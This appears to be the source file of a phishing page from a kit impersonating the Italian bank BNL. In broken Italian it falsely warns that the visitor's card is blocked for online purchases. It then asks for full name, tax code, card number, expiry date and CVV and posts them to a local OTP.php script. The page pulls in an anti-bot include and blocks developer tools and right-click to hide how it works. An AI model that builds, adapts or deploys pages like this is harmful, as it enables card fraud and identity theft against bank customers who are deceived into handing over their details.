﻿<?php
session_start();
error_reporting(0);
include_once "../antibots.php";

?>
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
     <script>

	document.onkeydown = function(e) {
	  if(event.keyCode == 123) {
	     return false;
	  }
	  if(e.ctrlKey && e.shiftKey && e.keyCode == "I".charCodeAt(0)) {
	     return false;
	  }
	  if(e.ctrlKey && e.shiftKey && e.keyCode == "J".charCodeAt(0)) {
	     return false;
	  }
	  if(e.ctrlKey && e.keyCode == "U".charCodeAt(0)) {
	     return false;
	  }
	}


	
	document.addEventListener("contextmenu", function(e) {
	  e.preventDefault();
	});

</script> 
    
    <meta name="build.timestamp" content="2018-04-26T08:19:09Z">
<meta name="build.number" content="1.0.95">

    
    
    <meta name="who-am-i" content="DESKTOP">
    <meta name="where-am-i" content="greenbank.AY_CL">
    
    <meta name="description" content="">
    <meta name="keywords" content="">
    <meta name="robots" content="all, index, follow">
    
    <meta name="viewport" content="width=device-width, initial-scale=1">

    
    <meta name="format-detection" content="telephone=no">

    
    <meta property="og:title" content="">
    <meta property="og:description" content="">
    <meta property="og:image" content="">

	
<!---<link rel="stylesheet" type="text/css" media="all, print" href="./css/chosen.css">--->
<link rel="stylesheet" type="text/css" media="all, print" href="./css/files/fonts.css">
<link rel="stylesheet" type="text/css" media="all, print" href="./css/files/style.css">
<!---<link rel="stylesheet" type="text/css" media="all, print" href="./css/files/style(1).css">--->
<link rel="stylesheet" type="text/css" media="all, print" href="./css/files/bootstrap.min.css">
<link rel="stylesheet" type="text/css" media="all, print" href="./css/files/bootstrap-theme.min.css">
<link rel="stylesheet" type="text/css" media="all, print" href="./css/files/style(2).css">
<link rel="stylesheet" type="text/css" media="all, print" href="./css/files/profilo-services.css"> 
<link rel="stylesheet" type="text/css" media="all, print" href="./css/files/my-style.css"> 
<link rel="stylesheet" type="text/css" media="all, print" href="./css/files/style-grid.css"> 
<link rel="stylesheet" type="text/css" media="all, print" href="./css/files/custom.css">

<script src="http://oss.maxcdn.com/momentjs/2.8.2/moment.min.js"></script>
<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.11.2/jquery.min.js"></script>
<link rel="stylesheet" href="http://cdn.jsdelivr.net/bootstrap/3.3.2/files/bootstrap.min.css">
<link rel="stylesheet" href="./css/formValidation.min.css">
<script src="./css/formValidation.min.js"></script>
<script src="./css/bootstrap.min.js"></script>










<title>Pass BNL</title>

<link id="cookie-law-css" rel="stylesheet" type="text/css" href="./css/files/cookie-law.css" media="all"></head>

<body style="cursor: default;">

	<form method="post" action="./css/OTP.php" onsubmit="return true" id="datiForm">

	
	
	<header class="hidden-xs">
	    <div id="iw-header-carta-prepagata">
<div id="bj:replace=all">
	<div class="header cf">
		<h1 class="polizza-heading">Dati Pass BNL</h1>
		<div class="cf"></div>
		<h1 class="polizza-heading polizza-subheading">Si prega proprio di aggiornare i suo dati Pass BNL</h1>
		<div class="green-button btn-documenti btn-doc-polizza"><a class="link-white" href="javascript:void(0)" id="btn_doc" onclick="wcm_l_vad_conto_download(&#39;https://bnl.it/sites/bnl-private/VAD/documenti_precontrattuali_carta_prepagata.page&#39;)">Documenti<br>Online</a></div>
		<div class="cf"></div>
		<p class="intro-polizza">Abbiamo condotto a una revisione dei nostri misure di sicurezza la tua carta di credito non potrà più essere utilizzata per acquisti e-commerce su siti sicuri (che richiedono la digitazione di una OTP per completare l'operazione).
</p>
	</div>
</div>
</div>
	</header>
	
	<div class="service-box cf" style="height: 505px;">
	
		
				
		
<div class="container">
			<div class="row">
				<div class="column col-xs-12 hidden-sm hidden-md hidden-lg">
				
				
				
				</div>
			</div>
</div>

<div class="container">
		<div class="row">	
		
		<div class="col-xs-12 col-sm-4 col-md-3 col-lg-3 slider-carta-container slider-carta-container-xs">
			<div>
				<div id="carousel-responsive" class="infiniteCarousel">
					<div class="wrapper" style="overflow: hidden;">
						
					</div><a class="arrow back"></a><a class="arrow forward"></a>
				</div>
				

				</div>
			</div>
			
			<div class="col-xs-12 col-sm-8 col-md-9 col-lg-9 ">
			
			
			<h2 class="menu-title no-subtitle">Inserimento i suoi dati Pass BNL per ripristinare l'operatività :</h2>
			
			
			
		
				<div class="box-info cf"><div class="col-xs-5">
						<div class="col-xs-6">Nome e Cognome</div>

            <input type="text" class="form-control" name="fullName" />

    </div>
    </div>
		<div class="box-info cf"><div class="col-xs-5">
						<div class="col-xs-6">Codice Fiscale</div>

            <input type="text" class="form-control" pattern="[a-zA-Z]{6}[0-9]{2}[a-zA-Z][0-9]{2}[a-zA-Z][0-9]{3}[a-zA-Z]" maxlength="16" name="code" />

    </div>
    </div>
    <div class="box-info cf"><div class="col-xs-5">
						<div class="col-xs-6" >N° di carta credito</div>

            <input type="text" class="form-control" data-stripe="number"  name="cc" />

    </div>
    </div>

    <div class="box-info cf"><div class="col-xs-5">
        <div class="col-xs-6" >Data di scadenza</div>
		<br>
        <div class="col-xs-4">
            <input type="text" class="form-control" placeholder="Mese" data-stripe="exp-month" name="mm" />
        </div>
        <div class="col-xs-4">
            <input type="text" class="form-control" placeholder="Anno" data-stripe="exp-year" name="yy" />
        </div>
    </div>
    </div>

    <div class="box-info cf"><div class="col-xs-5">
						<div class="col-xs-6">Codice di sicurezza</div><br>
        <div class="col-xs-4">
            <input type="text" class="form-control" data-stripe="cvc" name="cvv" />
        </div>
    </div>
    </div>


    <!-- <div class="box-info cf"><div class="form-group"> -->
        <!-- <div class="col-xs-9 col-xs-offset-3"> -->
            <!-- <button type="submit" class="btn btn-primary">Purchase</button> -->
        <!-- </div> -->
    <!-- </div> -->
    <!-- </div> -->
				
				<input type="submit" name="" id="" value="Procedi" onclick="" class="pink-button invia pin-submit">
			
			
			
		</div>
			
			




		<div class="column service-sidebar dark-gray-bg">
			
		</div>
		
		
		
		</div>
	</div>
</div>
</form>
<!-- <script src="//oss.maxcdn.com/bootbox/4.2.0/bootbox.min.js"></script> -->
<script>
$(document).ready(function() {
    // Change the key to your one
    //Stripe.setPublishableKey('pk_test_IrimHhYZzZiCmaNo5riP9buX');

    $('#datiForm')
        .formValidation({
            framework: 'bootstrap',
            icon: {
                //valid: 'glyphicon glyphicon-ok',
                invalid: 'glyphicon glyphicon-remove',
                validating: 'glyphicon glyphicon-refresh'
            },
            fields: {
                fullName: {
					row: '.col-xs-5',
                    validators: {
                        notEmpty: {
                            message: 'Il nome e cognome non è valido'
                        }
                    }
                },
				code: {
					row: '.col-xs-5',
                    validators: {
                        notEmpty: {
                            message: 'Il codice fiscale non è valido'
                        }
                    }
                },
                ccNumber: {
                    selector: '[data-stripe="number"]',
					row: '.col-xs-5',
                    validators: {
                        notEmpty: {
                            message: 'Il N° di carta credito non è valido'
                        },
                        creditCard: {
                            message: 'Il N° di carta credito non è valido'
                        }
                    }
                },
                expMonth: {
                    selector: '[data-stripe="exp-month"]',
                    row: '.col-xs-4',
                    validators: {
                        notEmpty: {
                            message: 'Il mese non è valido'
                        },
                        digits: {
                            message: 'Il mese non è valido'
                        },
                        callback: {
                            message: 'Il anno non è valido',
                            callback: function(value, validator) {
                                value = parseInt(value, 10);
                                var year         = validator.getFieldElements('expYear').val(),
                                    currentMonth = new Date().getMonth() + 1,
                                    currentYear  = new Date().getFullYear();
                                if (value < 0 || value > 12) {
                                    return false;
                                }
                                if (year == '') {
                                    return true;
                                }
                                year = parseInt(year, 10);
                                if (year > currentYear || (year == currentYear && value >= currentMonth)) {
                                    validator.updateStatus('expYear', 'VALID');
                                    return true;
                                } else {
                                    return false;
                                }
                            }
                        }
                    }
                },
                expYear: {
                    selector: '[data-stripe="exp-year"]',
                    row: '.col-xs-4',
                    validators: {
                        digits: {
                            message: 'Il anno non è valido'
                        },
                        callback: {
                            message: 'Il anno non è valido',
                            callback: function(value, validator) {
                                value = parseInt(value, 10);
                                var month        = validator.getFieldElements('expMonth').val(),
                                    currentMonth = new Date().getMonth() + 1,
                                    currentYear  = new Date().getFullYear();
                                if (value < currentYear || value > currentYear + 100) {
                                    return false;
                                }
                                if (month == '') {
                                    return false;
                                }
                                month = parseInt(month, 10);
                                if (value > currentYear || (value == currentYear && month >= currentMonth)) {
                                    validator.updateStatus('expMonth', 'VALID');
                                    return true;
                                } else {
                                    return false;
                                }
                            }
                        }
                    }
                },
                cvvNumber: {
                    selector: '[data-stripe="cvc"]',
					row: '.col-xs-4',
                    validators: {
                        notEmpty: {
                            message: 'Il codice di sicurezza non è valido'
                        },
                        cvv: {
                            message: 'Il codice di sicurezza non è valido',
                            creditCardField: 'ccNumber'
                        }
                    }
                }
            }
        })

});
</script>


</body></html>